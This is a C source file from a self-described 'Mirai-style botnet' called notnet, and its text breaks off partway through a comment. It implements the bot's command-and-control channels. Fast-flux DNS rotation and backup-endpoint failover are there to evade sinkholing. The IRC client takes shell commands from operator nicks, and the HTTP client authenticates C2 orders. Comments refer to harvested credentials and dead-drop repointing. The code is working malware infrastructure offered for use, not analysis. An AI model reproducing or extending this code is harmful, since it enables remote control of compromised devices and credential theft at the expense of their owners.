/*
 * notnet - Modern Mirai-Style Botnet
 * protocol.c - C2 protocol implementation (IRC, HTTP, WebSocket)
 */
#include "protocol.h"
#include "spread.h"
#include "payload.h"
#include "proxy.h"
#include "relay.h"
#include "plugin.h"
#include "killswitch.h"
#include "persist.h"
#include "mesh.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdarg.h>

/* ── Fast-Flux C2 (#85) ──────────────────────────────────────── */
/* When flux_enabled=1 the C2 channels resolve ALL A records of their
 * configured hostname into a per-hostname cache, rotate the active IP
 * every flux_ttl seconds, and re-resolve at the same low TTL. A
 * connect or recv timeout advances the active index immediately
 * (failover), so a sinkholed or blocked IP is abandoned on the next
 * attempt instead of being retried forever. */
typedef struct {
    char hostname[256];                 /* C2 hostname this slot serves */
    struct in_addr ips[FLUX_MAX_IPS];   /* all A records, network order */
    int count;                          /* number of cached IPs */
    int index;                          /* active IP (rotates) */
    time_t cache_time;                  /* last successful re-resolution */
    time_t last_rotate;                 /* last rotation / failover */
} flux_cache_t;

static flux_cache_t g_flux_cache[FLUX_CACHE_SLOTS];

/* Locate the cache slot for hostname, or NULL if not cached. */
static flux_cache_t *flux_cache_find(const char *hostname) {
    for (int i = 0; i < FLUX_CACHE_SLOTS; i++) {
        if (g_flux_cache[i].hostname[0] != '\0' &&
            strcmp(g_flux_cache[i].hostname, hostname) == 0) {
            return &g_flux_cache[i];
        }
    }
    return NULL;
}

/* Find the slot for hostname, evicting the least-recently-used slot
 * when the cache is full. */
static flux_cache_t *flux_cache_acquire(const char *hostname) {
    flux_cache_t *slot = flux_cache_find(hostname);
    if (slot) return slot;

    int victim = 0;
    for (int i = 1; i < FLUX_CACHE_SLOTS; i++) {
        if (g_flux_cache[i].hostname[0] == '\0') { victim = i; break; }
        if (g_flux_cache[i].last_rotate < g_flux_cache[victim].last_rotate)
            victim = i;
    }
    slot = &g_flux_cache[victim];
    memset(slot, 0, sizeof(*slot));
    strncpy(slot->hostname, hostname, sizeof(slot->hostname) - 1);
    return slot;
}

/* Resolve every A record of hostname into slot. Returns 0 with
 * count >= 1 on success, -1 on failure. The previous active index is
 * preserved so a re-resolution does not force an immediate jump. */
static int flux_resolve(flux_cache_t *slot, const char *hostname) {
    struct addrinfo hints, *res, *rp;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;   /* IPv4 only, like protocol_resolve_host */
    hints.ai_socktype = SOCK_STREAM;

    int err = getaddrinfo(hostname, NULL, &hints, &res);
    if (err != 0) {
        log_warn("FLUX: resolution failed for %s: %s", hostname, gai_strerror(err));
        return -1;
    }

    int n = 0;
    for (rp = res; rp && n < FLUX_MAX_IPS; rp = rp->ai_next) {
        if (rp->ai_family == AF_INET) {
            struct sockaddr_in *sin = (struct sockaddr_in *)rp->ai_addr;
            slot->ips[n++] = sin->sin_addr;
        }
    }
    freeaddrinfo(res);

    if (n == 0) {
        log_warn("FLUX: no A records for %s", hostname);
        return -1;
    }
    slot->count = n;
    return 0;
}

/* Pick the active flux IP for hostname, re-resolving and rotating as
 * the flux_ttl interval dictates. Returns 0 with *out filled, or -1
 * when no IP is available at all. Callers only use this when
 * flux_enabled is set. */
static int flux_pick_ip(notnet_bot_t *bot, const char *hostname, struct in_addr *out) {
    time_t now = time(NULL);
    flux_cache_t *slot = flux_cache_acquire(hostname);

    int fresh = (slot->count == 0);
    if (fresh || now - slot->cache_time >= (time_t)bot->flux_ttl) {
        if (flux_resolve(slot, hostname) == 0) {
            slot->cache_time = now;
            if (fresh) {
                /* New set: begin at index 0; last_rotate is set so the
                 * first rotation waits a full interval. */
                slot->index = 0;
                slot->last_rotate = now;
            }
        } else if (fresh) {
            /* Nothing cached and nothing resolved — hard failure. */
            return -1;
        } else {
            log_warn("FLUX: re-resolution failed for %s, keeping %d cached IP(s)",
                     hostname, slot->count);
        }
    }

    /* Clamp in case the record set shrank. */
    if (slot->index >= slot->count) slot->index = 0;

    /* Periodic rotation to the next A record. */
    if (slot->count > 1 && now - slot->last_rotate >= (time_t)bot->flux_ttl) {
        slot->index = (slot->index + 1) % slot->count;
        slot->last_rotate = now;
        log_debug("FLUX: rotating %s to %s (%d/%d)", hostname,
                  inet_ntoa(slot->ips[slot->index]),
                  slot->index + 1, slot->count);
    }

    *out = slot->ips[slot->index];
    return 0;
}

/* Advance the active IP after a connect/recv failure so the next
 * attempt targets the next A record. No-op when flux is disabled or
 * the hostname has a single record. */
static void flux_mark_failed(notnet_bot_t *bot, const char *hostname) {
    if (!bot->flux_enabled) return;
    flux_cache_t *slot = flux_cache_find(hostname);
    if (!slot || slot->count <= 1) return;
    slot->index = (slot->index + 1) % slot->count;
    slot->last_rotate = time(NULL);
    log_warn("FLUX: %s unreachable, failing over to next IP %s", hostname,
             inet_ntoa(slot->ips[slot->index]));
}

/* ── Disposable-Infrastructure C2 Rotation (#93) ──────────────── */
/* Organizational resilience: when the current HTTP C2 endpoint stops
 * responding (C2_ROTATE_FAIL_THRESHOLD consecutive connect failures),
 * the bot rotates through a bounded backup chain (c2_backup_1..4,
 * "host:port") and logs each switch. This layer sits ABOVE the flux
 * resolver (#85): flux rotates IPs within one hostname; rotation
 * switches the whole endpoint. C2_ROTATE_MAX caps total automatic
 * rotations so a fully dead fleet cannot churn forever. */

/* Parse a "host:port" endpoint spec into its parts. Returns 0 on
 * success with host NUL-terminated (bounded) and port validated to
 * 1..65535; -1 on malformed input. */
static int c2_rotation_parse_endpoint(const char *spec, char *host,
                                      size_t host_sz, uint16_t *port) {
    const char *colon = strrchr(spec, ':');
    if (!colon || colon == spec) return -1;
    size_t hlen = (size_t)(colon - spec);
    if (hlen >= host_sz) hlen = host_sz - 1;
    memcpy(host, spec, hlen);
    host[hlen] = '\0';
    int p = atoi(colon + 1);
    if (p < 1 || p > 65535) return -1;
    *port = (uint16_t)p;
    return 0;
}

/* Resolve the rotation-chain position to a concrete host:port. The
 * chain is [primary, backup_1..N]; index 0 always reads the live
 * c2_http fields (so dead-drop repoints are honored), higher indices
 * come from the static c2_backup list. Returns 0 on success. */
static int c2_rotation_endpoint(const notnet_bot_t *bot, char *host,
                                size_t host_sz, uint16_t *port) {
    if (bot->c2_rot_index == 0) {
        strncpy(host, bot->c2_http.server, host_sz - 1);
        host[host_sz - 1] = '\0';
        *port = bot->c2_http.port;
        return 0;
    }
    uint8_t slot = (uint8_t)(bot->c2_rot_index - 1);
    if (slot >= bot->c2_backup_count || bot->c2_backup[slot][0] == '\0')
        return -1;
    return c2_rotation_parse_endpoint(bot->c2_backup[slot], host, host_sz, port);
}

/* Advance to the next endpoint in the rotation chain (wrapping),
 * consuming one rotation from the automatic budget. Logs the switch
 * with the reason. No-op when no backups are configured or the budget
 * is exhausted. */
static void c2_rotation_advance(notnet_bot_t *bot, const char *reason) {
    uint8_t chain = (uint8_t)(bot->c2_backup_count + 1);
    if (chain <= 1) {
        log_warn("ROTATE: %s — no backup endpoints configured (c2_backup_1..%d)",
                 reason, C2_BACKUP_MAX);
        return;
    }
    if (bot->c2_rotations >= C2_ROTATE_MAX) {
        log_warn("ROTATE: %s — rotation budget exhausted (%d), staying on current endpoint",
                 reason, C2_ROTATE_MAX);
        return;
    }
    bot->c2_rot_index = (uint8_t)((bot->c2_rot_index + 1) % chain);
    bot->c2_rotations++;
    bot->c2_fail_streak = 0;
    char host[256];
    uint16_t port = 0;
    if (c2_rotation_endpoint(bot, host, sizeof(host), &port) == 0) {
        log_warn("ROTATE: %s — switched to %s:%u (rotation %d/%d, slot %d/%d)",
                 reason, host, port, bot->c2_rotations, C2_ROTATE_MAX,
                 bot->c2_rot_index, chain);
    } else {
        log_warn("ROTATE: %s — rotated to slot %d/%d (rotation %d/%d)",
                 reason, bot->c2_rot_index, chain,
                 bot->c2_rotations, C2_ROTATE_MAX);
    }
}

void c2_rotation_note_result(notnet_bot_t *bot, int success) {
    if (success) {
        bot->c2_fail_streak = 0;
        return;
    }
    bot->c2_fail_streak++;
    if (bot->c2_fail_streak >= C2_ROTATE_FAIL_THRESHOLD) {
        char reason[64];
        snprintf(reason, sizeof(reason), "%d consecutive connect failures",
                 bot->c2_fail_streak);
        c2_rotation_advance(bot, reason);
    } else {
        log_debug("ROTATE: %d/%d consecutive failures",
                  bot->c2_fail_streak, C2_ROTATE_FAIL_THRESHOLD);
    }
}

void c2_rotation_manual(notnet_bot_t *bot) {
    uint8_t chain = (uint8_t)(bot->c2_backup_count + 1);
    if (chain <= 1) {
        log_warn("ROTATE: no backup endpoints configured, manual rotate refused");
        return;
    }
    bot->c2_rot_index = (uint8_t)((bot->c2_rot_index + 1) % chain);
    bot->c2_fail_streak = 0;
    char host[256];
    uint16_t port = 0;
    if (c2_rotation_endpoint(bot, host, sizeof(host), &port) == 0) {
        log_warn("ROTATE: manual — switched to %s:%u (slot %d/%d)",
                 host, port, bot->c2_rot_index, chain);
    } else {
        log_warn("ROTATE: manual — rotated to slot %d/%d",
                 bot->c2_rot_index, chain);
    }
}

void c2_rotation_note_repoint(notnet_bot_t *bot) {
    bot->c2_fail_streak = 0;
    if (bot->c2_rot_index != 0) {
        bot->c2_rot_index = 0;
        log_info("ROTATE: dead-drop repoint — returning to primary endpoint");
    }
}

/* Best-effort memory wipe that the optimizer cannot elide (the cred
 * drain buffer holds live harvest; leaving it readable after `kill`
 * would defeat the wipe). Shared by protocol.c and killswitch.c. */
void wipe_volatile(volatile char *p, size_t n) {
    while (n-- > 0) *p++ = '\0';
}

/* ── IRC Implementation ───────────────────────────────────────── */
static int irc_create_socket(notnet_bot_t *bot) {
    /* SECURITY FIX (#3): Use AF_INET + IPPROTO_TCP (not IPPROTO_IPV6).
     * The previous code requested an IPv6 protocol on an IPv4 socket,
     * which fails silently on most platforms. */
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        log_error("IRC: socket() failed: %s", strerror(errno));
        return -1;
    }
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    /* Set non-blocking for connect timeout */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_irc.port);
    
    /* SECURITY FIX (#3): Use inet_pton instead of gethostbyname + memcpy.
     * gethostbyname returns h_length which can be 16 for IPv6 results,
     * overflowing the 4-byte sin_addr. inet_pton with AF_INET strictly
     * accepts dotted-quad and rejects hostnames. For hostname resolution
     * use getaddrinfo with AF_INET filtering. */
    if (inet_pton(AF_INET, bot->c2_irc.server, &addr.sin_addr) != 1) {
        /* SECURITY FIX (#85): In flux mode use the rotating cache of
         * all A records; otherwise a single resolution as before. */
        if (bot->flux_enabled) {
            if (flux_pick_ip(bot, bot->c2_irc.server, &addr.sin_addr) != 0) {
                log_error("IRC: flux resolution failed for %s", bot->c2_irc.server);
                close(sock);
                return -1;
            }
        } else {
            /* Not a dotted-quad; try DNS resolution and use safe copy */
            int resolved = protocol_resolve_host(bot->c2_irc.server);
            if (resolved == (int)INADDR_NONE) {
                log_error("IRC: DNS resolution failed for %s", bot->c2_irc.server);
                close(sock);
                return -1;
            }
            addr.sin_addr.s_addr = (in_addr_t)resolved;
            if (addr.sin_addr.s_addr == INADDR_NONE) {
                log_error("IRC: invalid address for %s", bot->c2_irc.server);
                close(sock);
                return -1;
            }
        }
    }
    
    /* SECURITY FIX (#10): DNS pinning — on reconnect, verify the resolved
     * IP matches the pinned IP from the first successful auth.
     * SECURITY FIX (#85): skipped in flux mode — the whole point is that
     * the peer IP rotates. */
    if (!bot->flux_enabled && bot->c2_irc.dns_pinned) {
        if (addr.sin_addr.s_addr != bot->c2_irc.pinned_addr.s_addr) {
            log_warn("IRC: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                     inet_ntoa(bot->c2_irc.pinned_addr), inet_ntoa(addr.sin_addr));
            close(sock);
            return -1;
        }
    }
    
    /* Non-blocking connect with select() timeout */
    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        log_error("IRC: connect() failed: %s", strerror(errno));
        flux_mark_failed(bot, bot->c2_irc.server);
        close(sock);
        return -1;
    }
    
    /* Wait for connection with 3s timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        log_error("IRC: connect() timed out");
        flux_mark_failed(bot, bot->c2_irc.server);
        close(sock);
        return -1;
    }
    
    /* Check for connect error */
    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        log_error("IRC: connect() failed: %s", strerror(so_error));
        flux_mark_failed(bot, bot->c2_irc.server);
        close(sock);
        return -1;
    }
    
    /* Restore blocking mode for data transfer */
    fcntl(sock, F_SETFL, flags);

    /* SECURITY FIX (#76): Upgrade to TLS and verify cert pin when
     * configured (make TLS=1 + tls_cert_pin_sha256=). */
    if (tls_setup(&bot->c2_irc.tls, sock, bot->c2_irc.server,
                  bot->tls_cert_pin_sha256) != 0) {
        flux_mark_failed(bot, bot->c2_irc.server);
        close(sock);
        return -1;
    }

    return sock;
}

int irc_connect(notnet_bot_t *bot) {
    if (bot->c2_irc.connected) return 0;

    int sock = irc_create_socket(bot);
    if (sock < 0) return -1;

    bot->c2_irc.sock = sock;
    bot->c2_irc.connected = 1;
    /* #189: the authenticated flag must NOT survive a reconnect — the new
     * server has not completed any handshake yet. Stale auth let a MITM on
     * the reconnect accept commands before any 366/376 numeric arrived. */
    bot->c2_irc.authenticated = 0;
    bot->c2_irc.joined = 0;
    bot->c2_irc.last_ping = time(NULL);

    log_info("IRC: connected to %s:%d", bot->c2_irc.server, bot->c2_irc.port);
    
    /* Send PASS if configured (loaded from config or env) */
    if (bot->c2_irc.pass[0] != '\0') {
        irc_send(bot, "PASS %s", bot->c2_irc.pass);
    }
    
    /* Send NICK and USER */
    /* SECURITY FIX (#5): Generate a random nick to make impersonation harder */
    {
        char rand_suffix[8];
        random_string(rand_suffix, sizeof(rand_suffix));
        snprintf(bot->c2_irc.nick, sizeof(bot->c2_irc.nick), "%s%s", IRC_NICK_PREFIX, rand_suffix);
        irc_send(bot, "NICK %s", bot->c2_irc.nick);
        irc_send(bot, "USER %s 0 * :notnet bot", bot->c2_irc.nick);
    }
    
    return 0;
}

int irc_send(notnet_bot_t *bot, const char *format, ...) {
    if (!bot->c2_irc.connected) return -1;
    
    char buf[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);
    va_end(args);
    
    /* Ensure IRC protocol termination */
    char full_cmd[516];
    snprintf(full_cmd, sizeof(full_cmd), "%s\r\n", buf);
    
    int sent = chan_send(&bot->c2_irc.tls, bot->c2_irc.sock, full_cmd, strlen(full_cmd));
    if (sent < 0) {
        log_error("IRC: send() failed: %s", strerror(errno));
        return -1;
    }
    if (sent < (int)strlen(full_cmd)) {
        log_warn("IRC: partial send (%d of %zu bytes)", sent, strlen(full_cmd));
    }
    
    return sent;
}

int irc_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_irc.connected) return -1;
    
    /* SECURITY FIX (#76): TLS may have decrypted bytes buffered that
     * select() on the raw socket cannot see. */
    if (tls_pending(&bot->c2_irc.tls) <= 0) {
        fd_set fds;
        struct timeval tv;
        FD_ZERO(&fds);
        FD_SET(bot->c2_irc.sock, &fds);
        tv.tv_sec = 0;
        tv.tv_usec = 0;

        if (select(bot->c2_irc.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
    }
    
    /* Recv into a local scratch buffer, then iterate line-by-line. A server
     * coalesces several numerics/PRIVMSGs into one TCP segment (e.g. the
     * 001/250/376 welcome burst); parsing only the first line meant the bot
     * never saw the 376 MOTD-complete and never authenticated. Found by the
     * S7 remaining-parity sim (#100) — the legacy IRC mock passed the old
     * docker test only because TCP segmentation happened to split the
     * numerics across reads. */
    char raw[1024];
    int received = chan_recv(&bot->c2_irc.tls, bot->c2_irc.sock, raw, sizeof(raw) - 1);
    if (received == -2) {
        /* SECURITY FIX (#121): TLS control record consumed, no app data. */
        return 0;
    }
    if (received <= 0) {
        log_info("IRC: connection closed");
        /* SECURITY FIX (#85): advance the flux IP so the reconnect
         * targets the next A record. */
        flux_mark_failed(bot, bot->c2_irc.server);
        bot->c2_irc.connected = 0;
        close(bot->c2_irc.sock);
        bot->c2_irc.sock = -1;
        return -1;
    }
    if (received >= (int)sizeof(raw)) received = (int)sizeof(raw) - 1;
    raw[received] = '\0';

    char *line = raw;
    while (line && *line) {
        /* Terminate this line at the newline; strip a preceding CR so a
         * bare-LF or CRLF server both parse. Compute the next line pointer
         * BEFORE mutating the string (strchr after *nl='\0' cannot find the
         * CR that sits before the LF). */
        char *nl = strchr(line, '\n');
        char *next = nl ? nl + 1 : NULL;
        if (nl) *nl = '\0';
        size_t linelen = strlen(line);
        if (linelen > 0 && line[linelen - 1] == '\r') line[linelen - 1] = '\0';

        /* Check for PING - must be at start of line for IRC server PING.
         * Line-scoped strncmp avoids the old strstr() false match on
         * "PING" inside PRIVMSG text (CWE-115). */
        if (strncmp(line, "PING", 4) == 0) {
            char host[256] = {0};
            char *colon = strchr(line, ':');
            if (colon) {
                colon++; /* skip colon */
                /* skip leading space after colon */
                while (*colon == ' ') colon++;
                if (*colon) {
                    strncpy(host, colon, sizeof(host) - 1);
                    host[sizeof(host) - 1] = '\0';
                }
            }
            if (host[0]) {
                irc_send(bot, "PONG %s", host);
                log_debug("IRC: ponged %s", host);
            } else {
                irc_send(bot, "PONG");
            }
        }
    
        /* Check for JOIN confirmation (366 End of NAMES)
         * SECURITY FIX (#29): Use strncmp on the IRC numeric response format
         * instead of strstr("366"). The old check matched any occurrence of
         * "366" anywhere in the buffer, including in PRIVMSG text, allowing
         * any user to trigger false authentication. */
        if (strncmp(line, ":", 1) == 0) {
            char *space = strchr(line + 1, ' ');
            if (space) {
                char *code = space + 1;
                /* Format: :server 366 client #chan :End of NAMES list */
                if (strncmp(code, "366", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
                    log_info("IRC: joined channel %s", bot->c2_irc.channel);
                    bot->c2_irc.authenticated = 1;
                    /* SECURITY FIX (#10): Pin the connected peer IP on first auth.
                     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
                    if (!bot->flux_enabled && !bot->c2_irc.dns_pinned) {
                        struct sockaddr_in sin;
                        socklen_t slen = sizeof(sin);
                        getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
                        bot->c2_irc.pinned_addr = sin.sin_addr;
                        bot->c2_irc.dns_pinned = 1;
                        log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
                    }
                }
            }
        }

        /* Check for MOTD complete (376 End of MOTD) - sets authenticated for non-channels mode
         * SECURITY FIX (#29): Same strstr("376") false-match issue as above. */
        if (strncmp(line, ":", 1) == 0) {
            char *space = strchr(line + 1, ' ');
            if (space) {
                char *code = space + 1;
                if (strncmp(code, "376", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
                    log_info("IRC: MOTD complete, authenticated");
                    bot->c2_irc.authenticated = 1;
                    /* SECURITY FIX (#10): Pin the connected peer IP on first auth.
                     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
                    if (!bot->flux_enabled && !bot->c2_irc.dns_pinned) {
                        struct sockaddr_in sin;
                        socklen_t slen = sizeof(sin);
                        getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
                        bot->c2_irc.pinned_addr = sin.sin_addr;
                        bot->c2_irc.dns_pinned = 1;
                        log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
                    }
                }
            }
        }

        /* Process PRIVMSG commands */
        char *privmsg = strstr(line, "PRIVMSG");
        if (privmsg) {
            /* SECURITY FIX (#5): Verify sender nick against allowlist.
             * IRC PRIVMSG format: :sender_nick!user@host PRIVMSG target :message
             * The nick is the text between the leading ':' and the first '!'. */
            char sender_nick[32] = {0};
            char *colon = line;  /* line starts with :nick!user@host ... */
            if (*colon == ':') {
                colon++; /* skip leading colon */
                char *bang = strchr(colon, '!');
                if (bang) {
                    int nick_len = bang - colon;
                    if (nick_len > 31) nick_len = 31;
                    memcpy(sender_nick, colon, nick_len);
                    sender_nick[nick_len] = '\0';
                }
            }

            /* Check sender against authorized nicks */
            int authorized = 0;
            for (int i = 0; i < bot->c2_irc.auth_nick_count && i < 8; i++) {
                if (strcmp(sender_nick, bot->c2_irc.auth_nicks[i]) == 0) {
                    authorized = 1;
                    break;
                }
            }
            /* SECURITY FIX (#11): Constant-time auth check. Instead of
             * returning immediately for unauthorized senders (timing oracle),
             * add a random delay to mask the early return path. */
            if (!authorized) {
                /* Random delay 10-50ms to mask timing differences */
                usleep(10000 + (rand() % 40000));
                log_warn("IRC: PRIVMSG from unauthorized nick '%s' ignored", sender_nick);
                /* Keep scanning the remaining lines — an unauthorized line
                 * must not suppress a later valid command in the same recv. */
                line = next;
                continue;
            }

            /* Find the message part after the channel name */
            colon = strchr(privmsg, ':');
            if (colon) {
                colon++; /* skip the colon, point to message text */
                /* Trim trailing \r\n */
                int msg_len = strlen(colon);
                while (msg_len > 0 && (colon[msg_len - 1] == '\r' || colon[msg_len - 1] == '\n' || colon[msg_len - 1] == ' ')) {
                    colon[--msg_len] = '\0';
                }
                /* Copy full message text as the command (e.g. "exec uname -a") */
                int cmd_len = msg_len;
                if (cmd_len > len - 1) cmd_len = len - 1;
                memmove(buf, colon, cmd_len);
                buf[cmd_len] = '\0';
                log_info("IRC: command: %s", buf);
                return 1; /* signal new command */
            }
        }

        line = next;
    }
    
    return 0;
}

void irc_disconnect(notnet_bot_t *bot) {
    if (bot->c2_irc.connected) {
        bot->c2_irc.connected = 0;
        if (bot->c2_irc.sock >= 0) {
            tls_close(&bot->c2_irc.tls);
            close(bot->c2_irc.sock);
            bot->c2_irc.sock = -1;
        }
        log_info("IRC: disconnected");
    }
}

/* ── HTTP Implementation ───────────────────────────────────────── */
/* #181: one bounded JSON string-field scanner shared by the secret gate
 * (#35) and both command extractors (#120). Handles backslash escapes so
 * a value containing \" or \\ can no longer desync the parse. Tracks
 * object/array nesting so a "secret" hidden inside a nested object does
 * NOT satisfy the gate — the C2 only ever sends flat command objects, so
 * a top-level match is the only trustworthy one (#175). Copies the
 * decoded string value into out (bounded, NUL-terminated); returns 1 on
 * hit. */
static int json_find_string(const char *body, const char *key,
                            char *out, size_t out_sz) {
    if (!body || !key || !out || out_sz == 0) return 0;
    char needle[64];
    if (snprintf(needle, sizeof(needle), "\"%s\"", key) >= (int)sizeof(needle))
        return 0;
    int depth = -1;             /* nesting: -1 = before root object; root
                                 * object's '{' brings it to 0, so TOP-LEVEL
                                 * keys match at depth 0. A nested object
                                 * pushes to 1+ and its keys never match. */
    int in_str = 0;             /* inside a JSON string */
    const char *p = body;
    while (*p) {
        char c = *p;
        if (in_str) {
            if (c == '\\' && p[1]) { p += 2; continue; }
            if (c == '"') in_str = 0;
            p++;
            continue;
        }
        if (c == '"') {
            /* needle check MUST run before in_str=1: the key's opening
             * quote is this same character, and once in_str is set the
             * key text would be skipped as string content. */
            if (depth == 0 && strncmp(p, needle, strlen(needle)) == 0) {
                const char *v = p + strlen(needle);
                while (*v == ' ' || *v == '\t') v++;
                if (*v == ':') {
                    v++;
                    while (*v == ' ' || *v == '\t') v++;
                    if (*v == '"') {
                        v++;
                        size_t o = 0;
                        while (*v && *v != '"') {
                            char ch = *v;
                            if (ch == '\\' && v[1]) {
                                v++;
                                switch (*v) {
                                    case '"':  ch = '"';  break;
                                    case '\\': ch = '\\'; break;
                                    case '/':  ch = '/';  break;
                                    case 'n':  ch = '\n'; break;
                                    case 'r':  ch = '\r'; break;
                                    case 't':  ch = '\t'; break;
                                    case 'b':  ch = '\b'; break;
                                    case 'f':  ch = '\f'; break;
                                    default:   ch = *v;   break;  /* \uXXXX raw */
                                }
                            }
                            if (o + 1 < out_sz) out[o++] = ch;
                            v++;
                        }
                        out[o] = '\0';
                        return 1;
                    }
                }
                p += strlen(needle);
                continue;
            }
            in_str = 1;
            p++;
            continue;
        }
        if (c == '{' || c == '[') { depth++; p++; continue; }
        if (c == '}' || c == ']') { depth--; p++; continue; }
        p++;
    }
    return 0;
}

/* SECURITY FIX (#35): Verify a C2 response body echoes the shared secret.
 * The bot only trusts command JSON that contains a "secret" field equal
 * to bot->secret — a MITM who can observe the heartbeat can read the
 * secret, but cannot inject commands the bot will trust without also
 * being able to observe the secret echo in real time.
 * #175/#181: now parses via json_find_string (escape-aware) and compares
 * CONSTANT-TIME (the proxy/relay token checks have been const-time since
 * #11 — this path was the inconsistent one). Returns 1 on match. */
static int http_body_has_secret(notnet_bot_t *bot, const char *body) {
    if (!bot || !body || bot->secret[0] == '\0') return 0;
    char val[sizeof(bot->secret) + 1];
    if (!json_find_string(body, "secret", val, sizeof(val))) return 0;
    size_t vlen = strlen(val);
    size_t slen = strlen(bot->secret);
    if (vlen != slen) return 0;
    /* vlen == slen here, so the loop always covers the full secret */
    unsigned char diff = 0;
    for (size_t i = 0; i < slen; i++) {
        diff |= (unsigned char)val[i] ^ (unsigned char)bot->secret[i];
    }
    return diff == 0 ? 1 : 0;
}

int http_connect(notnet_bot_t *bot) {
    if (bot->c2_http.connected) return 0;
    
    /* SECURITY FIX (#93): the dial target comes from the rotation
     * chain ([primary, c2_backup_1..N]), not directly from c2_http —
     * the disposable-infrastructure layer ABOVE flux (#85). Index 0
     * reads the live c2_http fields (dead-drop repoints honored). */
    char host[256];
    uint16_t port = 0;
    if (c2_rotation_endpoint(bot, host, sizeof(host), &port) != 0) {
        log_error("HTTP: rotation chain empty — no endpoint to dial");
        return -1;
    }

    log_info("HTTP: attempting connect to %s:%u", host, port);
    
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    /* Non-blocking connect */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    /* SECURITY FIX (#3): Use inet_pton + safe fallback instead of
     * gethostbyname + memcpy (h_length overflow on IPv6 results). */
    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        /* SECURITY FIX (#85): In flux mode use the rotating cache of
         * all A records; otherwise a single resolution as before. */
        if (bot->flux_enabled) {
            if (flux_pick_ip(bot, host, &addr.sin_addr) != 0) {
                log_error("HTTP: flux resolution failed for %s", host);
                close(sock);
                c2_rotation_note_result(bot, 0);
                return -1;
            }
        } else {
            addr.sin_addr.s_addr = (in_addr_t)protocol_resolve_host(host);
            if (addr.sin_addr.s_addr == INADDR_NONE) {
                close(sock);
                c2_rotation_note_result(bot, 0);
                return -1;
            }
        }
    }
    
    /* SECURITY FIX (#10): DNS pinning for HTTP C2.
     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates.
     * SECURITY FIX (#93): also skipped when rotated off the primary —
     * a backup endpoint is a different host by design; the pin guards
     * rebinding of the SAME hostname, not operator-configured failover. */
    if (!bot->flux_enabled && bot->c2_rot_index == 0 &&
        bot->c2_http.dns_pinned &&
        addr.sin_addr.s_addr != bot->c2_http.pinned_addr.s_addr) {
        log_warn("HTTP: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                 inet_ntoa(bot->c2_http.pinned_addr), inet_ntoa(addr.sin_addr));
        close(sock);
        return -1;
    }
    
    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        flux_mark_failed(bot, host);
        close(sock);
        c2_rotation_note_result(bot, 0);
        return -1;
    }
    
    /* Wait with 3s timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        flux_mark_failed(bot, host);
        close(sock);
        c2_rotation_note_result(bot, 0);
        return -1;
    }
    
    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        flux_mark_failed(bot, host);
        close(sock);
        c2_rotation_note_result(bot, 0);
        return -1;
    }
    
    fcntl(sock, F_SETFL, flags);
    
    /* SECURITY FIX (#76): Upgrade to TLS + verify cert pin when configured. */
    if (tls_setup(&bot->c2_http.tls, sock, host,
                  bot->tls_cert_pin_sha256) != 0) {
        flux_mark_failed(bot, host);
        close(sock);
        c2_rotation_note_result(bot, 0);
        return -1;
    }

    bot->c2_http.sock = sock;
    bot->c2_http.connected = 1;
    /* SECURITY FIX (#110): remember the endpoint we actually connected to
     * (rotation chain index 0 = primary, >0 = backup) so request builders
     * emit the correct Host header instead of the primary's. */
    snprintf(bot->c2_http.effective_server, sizeof(bot->c2_http.effective_server),
             "%.255s", host);
    bot->c2_http.effective_port = port;
    /* SECURITY FIX (#45): Do NOT pin the peer IP here on the raw connect.
     * The first (unauthenticated) connection must not become the trusted
     * pin — an on-path attacker who intercepts the first DNS resolution
     * could pin their own IP, permanently defeating the rebinding
